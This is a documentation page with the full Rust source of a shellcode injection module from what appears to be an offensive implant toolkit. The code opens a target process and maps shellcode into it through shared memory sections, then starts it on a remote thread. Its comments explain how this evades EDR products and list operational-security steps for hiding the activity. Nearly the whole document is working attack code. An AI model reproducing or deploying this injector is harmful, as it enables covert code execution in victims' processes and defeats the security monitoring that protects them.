# crowd -- mapping_inject.rs  (S TIER)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/mapping_inject.rs` |
| **Lines** | 307 |
| **Tier** | S |
| **Cards** | T007-process-injection |
| **Role** | Section mapping injection |
| **Unsafe blocks** | 4 |

## Purpose

# crowd -- mapping_inject.rs  (S TIER)

## Mapping Injection -- Shared Section Shellcode Injection

Injects shellcode into a remote process by leveraging shared memory sections
(NtCreateSection + NtMapViewOfSection) instead of NtWriteVirtualMemory.

### Why this bypasses EDR
NtWriteVirtualMemory is one of the most heavily hooked and monitored
syscalls by EDR products (CrowdStrike, SentinelOne, Defender ATP, etc.).
Cross-process writes via that API are a primary detection signal for
shellcode injection.

Mapping Injection avoids NtWriteVirtualMemory entirely:
- The write happens *locally* via a shared section view (plain memcpy)
- The remote process receives the same physical pages via a second mapping
- No cross-process memory write API is ever called

### Technique
```text
1. NtCreateSection(SEC_COMMIT, PAGE_EXECUTE_READWRITE)
-> creates anonymous pagefile-backed section

2. NtMapViewOfSection(section, NtCurrentProcess, PAGE_READWRITE)
-> map RW view into LOCAL process

3. memcpy(local_view, shellcode)
-> write shellcode into local view (no cross-process write!)

4. NtMapViewOfSection(section, target_process, PAGE_EXECUTE_READ)
-> map RX view into REMOTE process (same physical pages)

5. NtUnmapViewOfSection(NtCurrentProcess, local_view)
-> cleanup local mapping (optional but recommended for OPSEC)

6. NtCreateThreadEx(target_process, remote_view_base)
-> execute shellcode in remote process
```

### OPSEC
- Zero NtWriteVirtualMemory calls
- Zero VirtualAllocEx calls
- Section is pagefile-backed (no file on disk)
- Local view unmapped immediately after copy
- Remote view mapped as PAGE_EXECUTE_READ (no W permission at execution time)
- All NT calls via RecycledGate (ETW-TI sees ntdll origin)

## Constants

- `SECTION_ALL_ACCESS`: `u32` = `0xF001F`
- `PAGE_EXECUTE_READWRITE`: `u32` = `0x40`
- `PAGE_EXECUTE_READ`: `u32` = `0x20`
- `PAGE_READWRITE`: `u32` = `0x04`
- `SEC_COMMIT`: `u32` = `0x0800_0000`
- `PROCESS_ALL_ACCESS`: `u32` = `0x001F_FFFF`
- `THREAD_ALL_ACCESS`: `u32` = `0x001F_03FF`
- `NT_CURRENT_PROCESS`: `usize` = `(-1isize) as usize`
- `VIEW_UNMAP`: `u32` = `2`

## Types

### struct `ClientId` (line 259)

### struct `ObjectAttributes` (line 266)

## Public API

### `mapping_inject` `unsafe` (line 81)
```rust
pub unsafe fn mapping_inject(target_pid: u32, shellcode: &[u8]) -> Result<usize>
```
Inject shellcode into a remote process via shared section mapping.

Opens the target process by PID, performs mapping injection, and creates
a remote thread at the shellcode entry point.

Returns the remote thread handle on success. The caller is responsible
for closing it via `nt_close()` if desired, or can leave it open
(the handle is valid for the lifetime of the remote thread).

### `mapping_inject_handle` `unsafe` (line 104)
```rust
pub unsafe fn mapping_inject_handle(h_process: usize, shellcode: &[u8]) -> Result<usize>
```
Inject shellcode into a process via an already-opened handle.

The caller retains ownership of `h_process`; this function does not close it.
Returns the remote thread handle on success.

## Internal Functions

- `do_mapping_and_execute` (unsafe) — Core logic: map local view, copy shellcode, map remote view, create thread. (line 142)
- `open_process` (unsafe) — Open a process handle with PROCESS_ALL_ACCESS via NtOpenProcess (RecycledGate). (line 256)

## Key Dependencies

- `use anyhow::{anyhow, Result};`

## Full Source

```rust
//! # crowd -- mapping_inject.rs  (S TIER)
//!
//! ## Mapping Injection -- Shared Section Shellcode Injection
//!
//! Injects shellcode into a remote process by leveraging shared memory sections
//! (NtCreateSection + NtMapViewOfSection) instead of NtWriteVirtualMemory.
//!
//! ### Why this bypasses EDR
//! NtWriteVirtualMemory is one of the most heavily hooked and monitored
//! syscalls by EDR products (CrowdStrike, SentinelOne, Defender ATP, etc.).
//! Cross-process writes via that API are a primary detection signal for
//! shellcode injection.
//!
//! Mapping Injection avoids NtWriteVirtualMemory entirely:
//!   - The write happens *locally* via a shared section view (plain memcpy)
//!   - The remote process receives the same physical pages via a second mapping
//!   - No cross-process memory write API is ever called
//!
//! ### Technique
//! ```text
//! 1. NtCreateSection(SEC_COMMIT, PAGE_EXECUTE_READWRITE)
//!    -> creates anonymous pagefile-backed section
//!
//! 2. NtMapViewOfSection(section, NtCurrentProcess, PAGE_READWRITE)
//!    -> map RW view into LOCAL process
//!
//! 3. memcpy(local_view, shellcode)
//!    -> write shellcode into local view (no cross-process write!)
//!
//! 4. NtMapViewOfSection(section, target_process, PAGE_EXECUTE_READ)
//!    -> map RX view into REMOTE process (same physical pages)
//!
//! 5. NtUnmapViewOfSection(NtCurrentProcess, local_view)
//!    -> cleanup local mapping (optional but recommended for OPSEC)
//!
//! 6. NtCreateThreadEx(target_process, remote_view_base)
//!    -> execute shellcode in remote process
//! ```
//!
//! ### OPSEC
//! - Zero NtWriteVirtualMemory calls
//! - Zero VirtualAllocEx calls
//! - Section is pagefile-backed (no file on disk)
//! - Local view unmapped immediately after copy
//! - Remote view mapped as PAGE_EXECUTE_READ (no W permission at execution time)
//! - All NT calls via RecycledGate (ETW-TI sees ntdll origin)

#![allow(dead_code)]

use anyhow::{anyhow, Result};
use std::ffi::c_void;
use std::ptr::null_mut;

// ── Constants ────────────────────────────────────────────────────────────────

const SECTION_ALL_ACCESS:       u32 = 0xF001F;
const PAGE_EXECUTE_READWRITE:   u32 = 0x40;
const PAGE_EXECUTE_READ:        u32 = 0x20;
const PAGE_READWRITE:           u32 = 0x04;
const SEC_COMMIT:               u32 = 0x0800_0000;
const PROCESS_ALL_ACCESS:       u32 = 0x001F_FFFF;
const THREAD_ALL_ACCESS:        u32 = 0x001F_03FF;
const NT_CURRENT_PROCESS:       usize = (-1isize) as usize;

// ViewUnmap = 2 (InheritDisposition for NtMapViewOfSection).
// BUG FIX: Was incorrectly set to 1 (ViewShare), which causes the mapping to be
// inherited by child processes — a security/OPSEC leak in injection scenarios.
// ViewUnmap (2) ensures the mapping is private to the target process.
const VIEW_UNMAP: u32 = 2;

// ── Public API ───────────────────────────────────────────────────────────────

/// Inject shellcode into a remote process via shared section mapping.
///
/// Opens the target process by PID, performs mapping injection, and creates
/// a remote thread at the shellcode entry point.
///
/// Returns the remote thread handle on success. The caller is responsible
/// for closing it via `nt_close()` if desired, or can leave it open
/// (the handle is valid for the lifetime of the remote thread).
pub unsafe fn mapping_inject(target_pid: u32, shellcode: &[u8]) -> Result<usize> {
    if shellcode.is_empty() {
        return Err(anyhow!("MappingInject: shellcode is empty"));
    }

    let h_process = open_process(target_pid)?;

    match mapping_inject_handle(h_process, shellcode) {
        Ok(h_thread) => {
            crate::recycled::nt_close(h_process);
            Ok(h_thread)
        }
        Err(e) => {
            crate::recycled::nt_close(h_process);
            Err(e)
        }
    }
}

/// Inject shellcode into a process via an already-opened handle.
///
/// The caller retains ownership of `h_process`; this function does not close it.
/// Returns the remote thread handle on success.
pub unsafe fn mapping_inject_handle(h_process: usize, shellcode: &[u8]) -> Result<usize> {
    if shellcode.is_empty() {
        return Err(anyhow!("MappingInject: shellcode is empty"));
    }

    // ── Step 1: Create anonymous pagefile-backed section ─────────────────────
    let mut h_section: usize = 0;
    let mut max_size: u64 = shellcode.len() as u64;

    let st = crate::recycled::nt_create_section(
        &mut h_section,
        SECTION_ALL_ACCESS,
        null_mut(),          // no object attributes
        &mut max_size,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        0,                   // no file handle (pagefile-backed)
    );
    if st != 0 {
        return Err(anyhow!(
            "MappingInject: NtCreateSection failed: NTSTATUS 0x{:08x}",
            st as u32
        ));
    }

    // From here on, we must close h_section on any error path
    let result = do_mapping_and_execute(h_section, h_process, shellcode);

    crate::recycled::nt_close(h_section);

    result
}

// ── Internal implementation ──────────────────────────────────────────────────

/// Core logic: map local view, copy shellcode, map remote view, create thread.
///
/// `h_section` and `h_process` are borrowed -- caller manages their lifetime.
unsafe fn do_mapping_and_execute(
    h_section: usize,
    h_process: usize,
    shellcode: &[u8],
) -> Result<usize> {
    // ── Step 2: Map RW view into LOCAL process ───────────────────────────────
    let mut local_base: *mut c_void = null_mut();
    let mut local_size: usize = 0;

    let st = crate::recycled::nt_map_view_of_section(
        h_section,
        NT_CURRENT_PROCESS,
        &mut local_base,
        0,                   // zero_bits
        0,                   // commit_size (entire section)
        null_mut(),          // section_offset
        &mut local_size,
        VIEW_UNMAP,          // inherit_disposition
        0,                   // allocation_type
        PAGE_READWRITE,      // local: writable for memcpy
    );
    if st != 0 || local_base.is_null() {
        return Err(anyhow!(
            "MappingInject: local NtMapViewOfSection failed: NTSTATUS 0x{:08x}",
            st as u32
        ));
    }

    // ── Step 3: Copy shellcode into local view (NO cross-process write) ──────
    std::ptr::copy_nonoverlapping(
        shellcode.as_ptr(),
        local_base as *mut u8,
        shellcode.len(),
    );

    // ── Step 4: Map RX view into REMOTE process ──────────────────────────────
    // The remote view shares the same physical pages as the local view.
    // After this call, the shellcode bytes are accessible in the target process.
    let mut remote_base: *mut c_void = null_mut();
    let mut remote_size: usize = 0;

    let st = crate::recycled::nt_map_view_of_section(
        h_section,
        h_process,
        &mut remote_base,
        0,                   // zero_bits
        0,                   // commit_size
        null_mut(),          // section_offset
        &mut remote_size,
        VIEW_UNMAP,          // inherit_disposition
        0,                   // allocation_type
        PAGE_EXECUTE_READ,   // remote: executable, no write permission
    );

    // ── Step 5: Unmap local view (OPSEC: remove evidence from our process) ───
    // We do this regardless of the remote mapping result to clean up.
    let unmap_st = crate::recycled::nt_unmap_view_of_section(NT_CURRENT_PROCESS, local_base);
    if unmap_st != 0 {
        // Non-fatal but log-worthy in debug builds
        #[cfg(debug_assertions)]
        eprintln!(
            "[crowd] MappingInject: local unmap warning: NTSTATUS 0x{:08x}",
            unmap_st as u32
        );
    }

    // Now check if the remote mapping succeeded
    if st != 0 || remote_base.is_null() {
        return Err(anyhow!(
            "MappingInject: remote NtMapViewOfSection failed: NTSTATUS 0x{:08x}",
            st as u32
        ));
    }

    // ── Step 6: Create remote thread at shellcode base ───────────────────────
    let mut h_thread: usize = 0;

    let st = crate::recycled::nt_create_thread_ex(
        &mut h_thread,
        THREAD_ALL_ACCESS,
        null_mut(),          // object_attributes
        h_process,
        remote_base as *const c_void,  // start_routine = shellcode
        null_mut(),          // argument (NULL -- shellcode manages its own context)
        0,                   // create_flags (0 = start immediately)
        0,                   // zero_bits
        0,                   // stack_size (default)
        0,                   // maximum_stack_size (default)
        null_mut(),          // attribute_list
    );
    if st != 0 {
        // BUG FIX: Unmap the remote view to avoid leaking mapped memory in the
        // target process when thread creation fails. Without this cleanup, the
        // RX-mapped section remains in the remote process's address space forever.
        let _unmap_st = crate::recycled::nt_unmap_view_of_section(h_process, remote_base);
        #[cfg(debug_assertions)]
        if _unmap_st != 0 {
            eprintln!(
                "[crowd] MappingInject: remote unmap on thread failure also failed: NTSTATUS 0x{:08x}",
                _unmap_st as u32
            );
        }
        return Err(anyhow!(
            "MappingInject: NtCreateThreadEx failed: NTSTATUS 0x{:08x}",
            st as u32
        ));
    }

    Ok(h_thread)
}

/// Open a process handle with PROCESS_ALL_ACCESS via NtOpenProcess (RecycledGate).
///
/// Uses NtOpenProcess instead of Win32 OpenProcess to avoid kernel32 hooks.
unsafe fn open_process(pid: u32) -> Result<usize> {
    // CLIENT_ID structure: { UniqueProcess: HANDLE, UniqueThread: HANDLE }
    #[repr(C)]
    struct ClientId {
        unique_process: usize,
        unique_thread:  usize,
    }

    // OBJECT_ATTRIBUTES (minimal: all zeroed = no name, no root, no security)
    #[repr(C)]
    struct ObjectAttributes {
        length:                    u32,
        root_directory:            usize,
        object_name:               usize,
        attributes:                u32,
        security_descriptor:       usize,
        security_quality_of_service: usize,
    }

    let mut h_process: usize = 0;

    let mut obj_attr = ObjectAttributes {
        length: std::mem::size_of::<ObjectAttributes>() as u32,
        root_directory: 0,
        object_name: 0,
        attributes: 0,
        security_descriptor: 0,
        security_quality_of_service: 0,
    };

    let mut client_id = ClientId {
        unique_process: pid as usize,
        unique_thread: 0,
    };

    let st = crate::recycled::nt_open_process(
        &mut h_process,
        PROCESS_ALL_ACCESS,
        &mut obj_attr as *mut _ as *mut c_void,
        &mut client_id as *mut _ as *mut c_void,
    );

    if st != 0 || h_process == 0 {
        return Err(anyhow!(
            "MappingInject: NtOpenProcess(PID={}) failed: NTSTATUS 0x{:08x}",
            pid,
            st as u32
        ));
    }

    Ok(h_process)
}

```